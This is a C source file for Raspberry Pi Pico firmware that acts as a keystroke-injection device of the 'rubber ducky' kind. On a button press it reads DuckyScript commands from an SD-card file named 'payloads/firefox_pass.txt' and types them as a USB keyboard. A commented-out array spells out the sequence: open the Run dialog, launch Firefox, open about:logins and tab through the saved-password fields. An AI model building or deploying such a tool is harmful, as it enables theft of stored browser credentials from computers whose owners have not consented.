#include <stdlib.h>
#include <stdio.h>

#include "pico/stdlib.h"
#include "pico/multicore.h"

#include "bsp/board.h"
#include "hid_keyboard.h"
#include "http_server.h"

#include "sd_memory.h"

bool is_ducky_working = false;
HID_STATUS hid_status = HID_TASK_NOT_READY;

/* Core 1 main function */
void main(void)
{
  sdm_init();
  hid_init();

  static uint8_t i = 0;
  uint8_t buf[128];

  while (1)
  {
    if (board_button_read()) {
      while (board_button_read()) {};
      is_ducky_working = true;
      sdm_mount();
      sdm_open_read("payloads/firefox_pass.txt");
    }

    // char buf[][128]= { "GUI r\r\n", "DELAY 500\r\n", "STRING firefox\r\n", "ENTER\r\n", "DELAY 500\r\n", "STRING about:logins", "ENTER\r\n", "DELAY 500\r\n", "TAB", "REPEAT 9"};
    // char buf[][128] = {"DELAY 500\r\n", "STRING 3\r\n", "REPEAT 5\r\n" , "TAB\r\n", "REPEAT 4\r\n" };
    if (is_ducky_working && hid_status == HID_TASK_NOT_BUSY) {
      

      if(f_gets(buf, sizeof(buf), &tempFil)) {
      // if(buf[i]) {
        char *r = strstr(buf, "\r");
        if (r) *r = '\0';

        handle_ducky(buf, 0);
      }
      else {
        is_ducky_working = false;
        i = 0;
        sdm_close_file();
        sdm_unmount();
        gpio_put(15, 0);
      }
    }

    /* HID tasks */
    tud_task(); // tinyusb device task
    hid_status = hid_task();
    // led_blinking_task();
  } 
}

// /* Core 0 main function */
// int main(void)
// {
//   stdio_init_all();

//   // http_server_init();

//   multicore_launch_core1(main1);

//   while (1)
//   {
//     tight_loop_contents();
//   }

//   return 0;
// }
